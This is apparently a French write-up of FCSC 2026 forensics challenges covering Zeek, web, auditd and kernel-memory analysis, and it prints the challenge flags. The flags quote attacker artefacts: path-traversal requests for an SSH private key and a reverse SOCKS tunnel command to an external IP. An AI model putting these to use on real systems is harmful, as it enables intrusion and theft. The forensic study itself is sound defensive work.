---
title: "Forensics challenges"
date: 2026-04-13
platform: FCSC 2026
category: forensics
difficulty: medium
tags: [Zeek, Linux, Memory, KASLR, Forensics]
description: "Writeup des challenges forensics du FCSC 2026 : analyse de logs Zeek, audit Linux et dump mémoire kernel."
---

## Forenzeek — Compromission initiale

**Machine compromise :** `192.168.1.42`

On filtre le CSV Zeek sur cette IP :

```bash
grep "192.168.1.42" forenzeek.csv | tee -a victim.csv
wc -l victim.csv
```

Le vecteur étant un email malveillant, on filtre sur les ports mail :

```bash
awk '($6==110 || $6==143 || $6==993 || $6==995 || $6==443)' victim.csv | sort -k7 -nr | head
```

On tombe sur une connexion IMAPS (port 993) avec un `resp_bytes` élevé — le payload mail a été reçu par le serveur.

> Dans Zeek, `orig_h` = client initiateur. La machine compromise (192.168.1.42) initie la connexion vers le serveur mail, donc elle apparaît en `orig_h`. Le mail (payload) est envoyé par le serveur → `resp_bytes` élevé.

---

## Forenzeek — Latéralisation

On identifie les IPs les plus actives :

```bash
awk '{print $5}' forenzeek.csv | sort -V | uniq -c | sort -nr
# 59752 192.168.1.2
# 36346 192.168.1.5
```

Au vu des protocoles (53, 389...) on déduit que `192.168.1.2` est le DC AD. Par élimination, `192.168.1.5` est la machine admin.

On cherche les connexions de pivot latéral initiées par la 1.42 :

```bash
awk '$3=="192.168.1.42" && ($6==445 || $6==5985 || $6==5986 || $6==3389 || $6==22)' forenzeek.csv | sort -k7 -nr
```

On trouve une connexion vers `192.168.1.38` sur le **port 5986 (WinRM HTTPS)**.

---

## Web Logs

Recherche de path traversal avec status 200 :

```bash
strings webserver.log | grep -E "\.\./|%2e%2e|passwd|shadow" | grep "200"
```

```
FCSC{CWE-22-05/07-/?asset=../../../../home/webserver/.ssh/id_rsa-/?asset=../../../../home/webserver/.ssh/known_hosts}
```

---

## Grhelp — Connect back

On extrait les exécutions utiles depuis les logs auditd :

```bash
ausearch -sc execve -i > exec.txt
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' exec.txt | sort -u
```

Une IP externe sort du lot : `15.188.57.187`

```bash
grep "15.188.57.187" -A 10 exec.txt
# ./update client 15.188.57.187:9999 R:socks
```

```
FCSC{backupfiler.jurisdefense.intra-./update client 15.188.57.187:9999 R:socks}
```

---

## Grhelp — Exfiltration

```bash
grep "15.188.57.187" -A 10 exec.txt
```

Commande `scp` détectée. Attention : les logs auditd sont en UTC, il faut convertir.

```
FCSC{scp-/tmp/smb_share.tar.gz-2025-05-14T09:05:13}
```

---

## Adresses du noyau — Pour commencer (`intro.mem`)

### Objectif

Trouver les adresses physique et virtuelle de `_stext` (première instruction du kernel) dans un dump RAM **sans KASLR**.

### Adresse virtuelle

```bash
strings -t x intro.mem | grep _stext
# SYMBOL(_stext)=ffffffff81000000
```

### KASLR

**KASLR** (Kernel Address Space Layout Randomization) décale aléatoirement le kernel en mémoire à chaque boot pour empêcher un attaquant de connaître les adresses fixes.

- **KASLR virtuel** — décale l'adresse virtuelle du kernel
- **KASLR physique** — décale où le kernel est chargé en RAM

```bash
strings -t x intro.mem | grep phys_base
# NUMBER(phys_base)=0
```

`phys_base = 0` → pas de KASLR physique. La base physique par défaut sur x86_64 est `0x1000000` (`CONFIG_PHYSICAL_START`).

### Flag

```
FCSC{0x0000000001000000-0xffffffff81000000}
```

> Piège : l'énoncé demande des adresses 64 bits → padding obligatoire sur 16 chiffres hex.

---

## Adresses du noyau — Un peu d'aléa (`random.mem`)

### Objectif

Même exercice avec **KASLR activé** — deux slides s'additionnent :

```
phys_stext = 0x1000000 (base fixe)
           + phys_base (slide physique aléatoire)
           + KERNELOFFSET (slide virtuel, appliqué aussi en physique)

virt_stext = 0xffffffff81000000 (base virtuelle fixe)
           + KERNELOFFSET
```

### Adresse virtuelle

```bash
strings -t x random.mem | grep _stext
# SYMBOL(_stext)=ffffffff86000000
```

`KERNELOFFSET = 0xffffffff86000000 - 0xffffffff81000000 = 0x5000000`

### Slide physique

```bash
strings -t x random.mem | grep phys_base
# NUMBER(phys_base)=549453824
```

```python
hex(549453824)  # → 0x20c00000
```

### Calcul

```
phys_stext = 0x1000000 + 0x20c00000 + 0x5000000 = 0x26c00000
```

### Vérification dans le dump

```bash
python3 -c "
addrs = [0x1000000, 0x20c00000, 0x25c00000, 0x26c00000]
with open('random.mem', 'rb') as f:
    for addr in addrs:
        f.seek(addr)
        b = f.read(8)
        print(hex(addr), b.hex())
"
# 0x26c00000  66900faee8e90141  ← NOP x86 = début du kernel ✓
```

`6690` = NOP x86_64, caractéristique du début du kernel.

### Flag

```
FCSC{0x0000000026c00000-0xffffffff86000000}
```

---

## Leçons apprises

| Piège | Solution |
|-------|----------|
| Oublier la base fixe `0x1000000` | Toujours partir de `CONFIG_PHYSICAL_START` |
| Penser que `phys_base` seul suffit | Les deux slides s'additionnent |
| Oublier le padding 64 bits | Toujours formater sur 16 chiffres hex |
| Deviner sans vérifier | Lire le dump à l'adresse calculée pour confirmer |
